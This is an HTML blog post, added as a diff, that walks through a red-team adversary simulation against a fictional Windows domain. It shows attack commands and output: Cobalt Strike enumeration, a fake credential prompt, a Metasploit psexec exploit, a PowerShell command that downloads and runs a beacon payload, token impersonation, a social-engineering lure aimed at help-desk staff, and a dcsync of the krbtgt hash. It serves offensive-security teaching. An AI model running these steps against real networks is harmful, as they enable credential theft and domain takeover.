@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="your description">
+    <meta name="Author" content="Rasta Mouse">
+    <meta name="keywords" content="offensive security">
+    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
+    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
+    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
+    <title>Cheesy Rumbles</title>
+  </head><body><aside id="sidenav">
+    <header>
+    
+        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
+        
+    
+
+    <a id="branding" href=https://rastamouse.me>
+        
+            Cheesy Rumbles
+        
+    </a>
+    </header>
+
+    <nav>
+        
+            		
+            <a href="/"
+                
+            >
+                <i class="fas fa-home fa-sm"></i>
+                <span>home</span>
+            </a>
+        
+            		
+            <a href="/blog/"
+                
+            >
+                <i class="fas fa-keyboard fa-ms"></i>
+                <span>blog</span>
+            </a>
+        
+            		
+            <a href="/tags"
+                
+            >
+                <i class="fas fa-tags fa-ms"></i>
+                <span>tags</span>
+            </a>
+        
+            		
+            <a href="https://twitter.com/_RastaMouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-twitter fa-ms"></i>
+                <span>twitter</span>
+            </a>
+        
+            		
+            <a href="https://github.com/rasta-mouse"
+                
+                    target="_blank"
+                
+            >
+                <i class="fab fa-github fa-ms"></i>
+                <span>github</span>
+            </a>
+        
+            		
+            <a href="/index.xml"
+                
+            >
+                <i class="fas fa-rss fa-ms"></i>
+                <span>RSS</span>
+            </a>
+        
+    </nav>
+</aside>
+<main id="main">
+            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
+            <div class="content">
+    
+    <h1 id="title">PsExec Much?</h1>
+    
+      
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#foothold">Foothold</a></li>
+    <li><a href="#situational-awareness">Situational Awareness</a></li>
+    <li><a href="#local-privilege-escalation">Local Privilege Escalation</a></li>
+    <li><a href="#lateral-movement">Lateral Movement</a></li>
+    <li><a href="#user-hunting">User Hunting</a></li>
+    <li><a href="#game-over">Game Over</a></li>
+  </ul>
+</nav>
+    <p>I recently completed an adversary simulation and thought I would write a short post about some of my experiences.</p>
+<p>The target organisation had an interesting mix of both good (for &ldquo;regulatory compliance&rdquo; purposes) and bad security practices.  Once you&rsquo;ve been around the block enough, you come to learn that implementing security for the sole purpose of passing compliance audits isn&rsquo;t all that effective in mitigating against &ldquo;cyber attack&rdquo; (yeah, I said it), even against actors that aren&rsquo;t particularly sophisticated.</p>
+<h2 id="foothold">Foothold</h2>
+<p>We&rsquo;ll start with a session as the user <code>awhitehead</code>.  Note that everything you see here are fictional representations.</p>
+<figure>
+    <img src="/images/psexec/1-foothold.png"/> 
+</figure>
+
+<h2 id="situational-awareness">Situational Awareness</h2>
+<p>In this little setup, we have the following:</p>
+<pre><code>beacon&gt; net computers
+
+ Server Name             IP Address
+ -----------             ----------
+ FS-01                   172.16.0.199
+ DC-01                   172.16.0.200
+ WKSTN-01                172.16.0.201
+ WKSTN-02                172.16.0.202
+ WKSTN-03                172.16.0.203
+</code></pre><pre><code>beacon&gt; powershell Get-NetGroupMember -GroupName &quot;Domain Admins&quot;
+
+GroupDomain  : cyber-lance.local
+GroupName    : Domain Admins
+MemberDomain : cyber-lance.local
+MemberName   : lshah_da
+MemberSID    : S-1-5-21-884887136-373167198-2530644098-1110
+IsGroup      : False
+MemberDN     : CN=Logan Shah (DA),CN=Users,DC=cyber-lance,DC=local
+</code></pre><pre><code>beacon&gt; powershell Get-NetLocalGroup -GroupName Administrators | Select-Object AccountName
+
+AccountName
+-----------
+CYBER-LANCE/WKSTN-01/Administrator
+cyber-lance.local/Domain Admins
+cyber-lance.local/Desktop Support
+cyber-lance.local/awhitehead
+</code></pre><pre><code>beacon&gt; powershell Get-NetGroupMember -GroupName &quot;Desktop Support&quot;
+
+GroupDomain  : cyber-lance.local
+GroupName    : Desktop Support
+MemberDomain : cyber-lance.local
+MemberName   : kwilson_adm
+MemberSID    : S-1-5-21-884887136-373167198-2530644098-1109
+IsGroup      : False
+MemberDN     : CN=Keira Wilson (Admin),CN=Users,DC=cyber-lance,DC=local
+</code></pre><p>What we can observe so far:</p>
+<ul>
+<li>They&rsquo;re using separate accounts for DA and other administrative purposes.</li>
+<li>They suffix their usernames with <code>_da</code> and <code>_adm</code> accordingly.</li>
+<li>They add <code>(DA)</code> and <code>(Admin)</code> to their distinguished names.</li>
+<li><code>awhitehead</code> is a local admin on his workstation, but not with an <code>_adm</code> account.</li>
+</ul>
+<p>Knowing this convention makes it easy for us to quickly enumerate potential admin accounts:</p>
+<pre><code>beacon&gt; powershell Get-NetUser -Filter &quot;(samaccountname=*_adm)&quot; | Select-Object name, samaccountname
+
+name                                    samaccountname                         
+----                                    --------------                         
+Keira Wilson (Admin)                    kwilson_adm
+</code></pre><p>Or find if a standard user has an associated admin account:</p>
+<pre><code>beacon&gt; powershell Get-NetUser -Filter &quot;(samaccountname=kwilson*)&quot; | Select-Object name, samaccountname
+
+name                                    samaccountname                         
+----                                    --------------                         
+Keira Wilson                            kwilson                                
+Keira Wilson (Admin)                    kwilson_adm
+</code></pre><h2 id="local-privilege-escalation">Local Privilege Escalation</h2>
+<p><code>awhitehead</code> is a local admin, so there&rsquo;s potential for us to elevate privs on this workstation.  He doesn&rsquo;t have local admin on any other machine.  Before throwing UAC bypasses around, one should always check the UAC configuration.</p>
+<pre><code>beacon&gt; powershell Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+PSPath                      : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+PSParentPath                : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
+PSChildName                 : System
+PSDrive                     : HKLM
+PSProvider                  : Microsoft.PowerShell.Core\Registry
+ConsentPromptBehaviorAdmin  : 1
+ConsentPromptBehaviorUser   : 1
+EnableInstallerDetection    : 1
+EnableLUA                   : 1
+EnableSecureUIAPaths        : 1
+EnableUIADesktopToggle      : 1
+EnableVirtualization        : 1
+PromptOnSecureDesktop       : 1
+ValidateAdminCodeSignatures : 0
+dontdisplaylastusername     : 0
+legalnoticecaption          : 
+legalnoticetext             : 
+scforceoption               : 0
+shutdownwithoutlogon        : 1
+undockwithoutlogon          : 1
+FilterAdministratorToken    : 0
+</code></pre><p>Taken from MSDN:</p>
+<pre><code>ConsentPromptBehaviorAdmin  : 1  ---&gt;  This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.
+ConsentPromptBehaviorUser   : 1  ---&gt;  This option SHOULD be set to ensure that a standard user that needs to perform an operation that requires elevation of privilege will be prompted for an administrative user name and password. If the user enters valid credentials, the operation will continue with the applicable privilege.
+EnableLUA                   : 1  ---&gt;  This policy enables the &quot;administrator in Admin Approval Mode&quot; user type while also enabling all other User Account Control (UAC) policies.
+PromptOnSecureDesktop       : 1  ---&gt;  This policy will force all UAC prompts to happen on the user's secure desktop.
+</code></pre><p>This config broadly translate to the <code>Always Notfiy</code> setting you find in the Control Panel.  In reality, moving that slider affects several registry items at the same time.  So in this scenario, the user would see the UAC prompt if we tried any of the usual bypasses.</p>
+<p>If we had the users&rsquo; password, we could use PsExec to start an elevated session on this machine.  You can&rsquo;t <code>psexec</code> to and from the same host (at least in CS), so I pulled out the trusty Metasploit Framework.  To get the user&rsquo;s password, all we have to do is ask.</p>
+<p>I use a <a href="https://github.com/rasta-mouse/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1#L19-L21">modified version</a> of <a href="https://twitter.com/@enigma0x3">Matt Nelson&rsquo;s</a> <a href="https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1">Invoke-LoginPrompt</a>.  The only difference being that mine will pop an error message before prompting for creds - choosing something believable may increase the chance of them submitting without too much fuss.  Also, prompting for their standard account password (e.g. to reconnect Outlook) is easier to fool them into inventing a reason why they&rsquo;d need to enter creds for their admin account.</p>
+<pre><code>beacon&gt; powershell Invoke-LoginPrompt
+</code></pre><p><figure>
+    <img src="/images/psexec/2-fake-error.png"/> 
+</figure>
+
+<figure>
+    <img src="/images/psexec/3-login-prompt.png"/> 
+</figure>
+</p>
+<pre><code>UserName                   Domain                     Password                 
+--------                   ------                     --------                 
+awhitehead                 CYBER-LANCE                Passw0rd!
+</code></pre><p>Now to setup beacon and msf.</p>
+<pre><code>beacon&gt; socks 32479
+beacon&gt; sleep 0
+</code></pre><pre><code>msf &gt; setg Proxies socks4:163.172.129.30:32479
+msf &gt; use exploit/windows/smb/psexec_psh
+
+msf exploit(psexec) &gt; set RHOST 172.16.0.201
+msf exploit(psexec) &gt; set SMBDomain cyber-lance
+msf exploit(psexec) &gt; set SMBUSER awhitehead
+msf exploit(psexec) &gt; set SMBPASS Passw0rd!
+msf exploit(psexec) &gt; set payload windows/meterpreter/bind_tcp
+
+msf exploit(psexec) &gt; exploit 
+
+[*] Started bind handler
+[*] 172.16.0.201:445 - Connecting to the server...
+[*] 172.16.0.201:445 - Authenticating to 172.16.0.201:445|cyber-lance as user 'awhitehead'...
+[*] 172.16.0.201:445 - Selecting PowerShell target
+[*] 172.16.0.201:445 - Executing the payload...
+[+] 172.16.0.201:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (957487 bytes) to 172.16.0.201
+[*] Meterpreter session 1 opened (192.168.41.132:41409 -&gt; 163.172.129.30:32479) at 2017-06-17 21:04:05 +0100
+
+meterpreter &gt; sysinfo 
+Computer        : WKSTN-01
+OS              : Windows 7 (Build 7601, Service Pack 1).
+Architecture    : x86
+System Language : en_GB
+Domain          : CYBER-LANCE
+Logged On Users : 3
+Meterpreter     : x86/windows
+
+meterpreter &gt; getuid 
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><p>I like to hand the session back over to CS so I have everything in one place.  I&rsquo;ll do this by hosting a stageless PowerShell SMB beacon payload and use a reverse port forward to grab it.  The reason for doing it this way is that the outbound web proxy in this evironment has NTLM auth, which means processes running in SYSTEM context can&rsquo;t talk out to the Internet directly.</p>
+<pre><code>beacon&gt; rportfwd 6798 163.172.129.30 80
+</code></pre><pre><code>meterpreter &gt; shell
+Process 2896 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;powershell.exe -nop -w hidden -c &quot;iex ((new-object net.webclient).downloadstring('http://127.0.0.1:6798/smb'))&quot;
+</code></pre><pre><code>06/17 21:10:40 visit from: 163.172.129.30
+	Request: GET /smb
+	page Serves /opt/cobaltstrike/uploads/beacon.ps1
+	null
+</code></pre><pre><code>beacon&gt; link 127.0.0.1
+[+] established link to child beacon: 172.16.0.201
+</code></pre><figure>
+    <img src="/images/psexec/4-foothold-elevate.png"/> 
+</figure>
+
+<h2 id="lateral-movement">Lateral Movement</h2>
+<p>I would never normally recommend going down this route unless you had little alternative.</p>
+<p>As it currently stands I have no way of moving laterally across the workstations, but the members of <code>Desktop Support</code> do because they are local admins.  What I could do, is break an application (or carry out some other action) on <code>WKSTN-01</code> so that <code>awhitehead</code> needs to contact the support team for assistance.  They may then remote over to the workstation, where I can hijack their credentials or running process.</p>
+<p><code>awhitehead</code> is offered remote assistance by <code>Kiera Wilson (Admin)</code>, to which he accepts.</p>
+<figure>
+    <img src="/images/psexec/5-offerra.png"/> 
+</figure>
+
+<p>Keira will ask Andrew to allow her to respond to UAC prompts, which he will dutifully do.</p>
+<figure>
+    <img src="/images/psexec/6-offerra.png"/> 
+</figure>
+
+<p>Keira will then use her credentials to elevate on <code>WKSTN-01</code>, so she can carry out her investigations / fixes.</p>
+<figure>
+    <img src="/images/psexec/7-offerra.png"/> 
+</figure>
+
+<p>We now have <code>keira_adm</code> authenticated and running elevated processes on the compromised workstation.</p>
+<pre><code>beacon&gt; net logons
+Logged on users at \\localhost:
+
+CYBER-LANCE\kwilson_adm
+CYBER-LANCE\awhitehead
+CYBER-LANCE\awhitehead
+CYBER-LANCE\awhitehead
+CYBER-LANCE\WKSTN-01$
+</code></pre><pre><code>beacon&gt; shell tasklist /v | findstr /i kwilson_adm
+cmd.exe         3348     Console 1     2,272 K     Unknown     CYBER-LANCE\kwilson_adm     0:00:00       N/A                                                                     
+conhost.exe     3116     Console 1     3,988 K     Unknown     CYBER-LANCE\kwilson_adm     0:00:0100     N/A 
+</code></pre><pre><code>beacon&gt; make_token CYBER-LANCE\kwilson_adm Passw0rd!
+
+beacon&gt; psexec_psh wkstn-02 smb
+[+] established link to child beacon: 172.16.0.202
+
+beacon&gt; inject 3220 http
+</code></pre><p><code>3220</code> was the pid of explorer running as <code>kwilson</code>.  I also rearranged my beacons to the following.</p>
+<figure>
+    <img src="/images/psexec/8-kwilson.png"/> 
+</figure>
+
+<p>I purposely didn&rsquo;t continue using <code>kwilson_adm</code> on <code>WKSTN-01</code> - if I want to reuse her credentials to take the workstation of another privileged user, it will look more natural coming from <code>WKSTN-02</code> than <code>01</code>.  The same reason that once I took <code>WKSTN-02</code> from <code>WKSTN-01</code>, I terminated the connection. You wouldn&rsquo;t normally see connections going <code>01 -&gt; 02</code> but rather <code>02 -&gt; 01</code>.</p>
+<h2 id="user-hunting">User Hunting</h2>
+<p>To win the game, we now need to find the workstation of a DA, move across and plunder.  It&rsquo;s an obvious failing of this organisation, that even though they&rsquo;re using separate admin accounts, they&rsquo;re still used across low-tier workstations.  We should be able to find the standard account of a DA logged into a workstation and they&rsquo;ll be doing something like <code>runas mmc</code> with their DA creds.</p>
+<pre><code>beacon&gt; powershell Invoke-UserHunter
+
+UserDomain      : CYBER-LANCE
+UserName        : lshah_da
+ComputerName    : WKSTN-03.cyber-lance.local
+IPAddress       : 172.16.0.203
+SessionFrom     : 
+SessionFromName : 
+LocalAdmin      :  
+</code></pre><pre><code>beacon&gt; powershell Get-NetComputer | Get-NetLoggedOn | Where {$_.wkui1_username -like &quot;lshah_da&quot;} | Select-Object ComputerName
+
+ComputerName                                                                   
+------------                                                                   
+WKSTN-03.cyber-lance.local                                                     
+WKSTN-03.cyber-lance.local 
+</code></pre><pre><code>beacon&gt; psexec_psh wkstn-03 smb
+[+] established link to child beacon: 172.16.0.203
+</code></pre><pre><code>beacon&gt; net logons
+Logged on users at \\localhost:
+
+CYBER-LANCE\lshah_da
+CYBER-LANCE\lshah
+CYBER-LANCE\WKSTN-03$
+</code></pre><pre><code>beacon&gt; shell tasklist /v | findstr /i lshah_da
+mmc.exe     3220     Console 2     2,688 K     Unknown     CYBER-LANCE\lshah_da     0:00:00     N/A
+</code></pre><h2 id="game-over">Game Over</h2>
+<pre><code>beacon&gt; make_token CYBER-LANCE\lshah_da Passw0rd!
+beacon&gt; dcsync cyber-lance.local cyber-lance\krbtgt
+
+[DC] 'cyber-lance.local' will be the domain
+[DC] 'dc-01.cyber-lance.local' will be the DC server
+[DC] 'cyber-lance\krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 17/06/2017 17:22:39
+Object Security ID   : S-1-5-21-884887136-373167198-2530644098-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 8aa0265124c7696166d01c1431ff6c44
+    ntlm- 0: 8aa0265124c7696166d01c1431ff6c44
+    lm  - 0: b5cf441f199c4456800a29a0312146b7
+</code></pre>
+    
+    <div class="nav-next-prev">
+        <div class="nav-prev">
+            
+                <a href="https://rastamouse.me/blog/playing-with-cuckoo/"><i class="fas fa-chevron-left"></i></a>
+            
+        </div>
+        <a class="nav-top" href="#">top</i></a>
+        <div class="nav-next">
+            
+                <a href="https://rastamouse.me/blog/anti-virus/"><i class="fas fa-chevron-right"></i></a>
+            
+        </div>
+    </div>
+    
+
+            </div><footer>
+<div class="footer-content">
+
+
+<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>
+
+</div>
+</footer></main>
+    </body>
+    <script src=https://rastamouse.me/js/navbutton.js></script>
+</html>
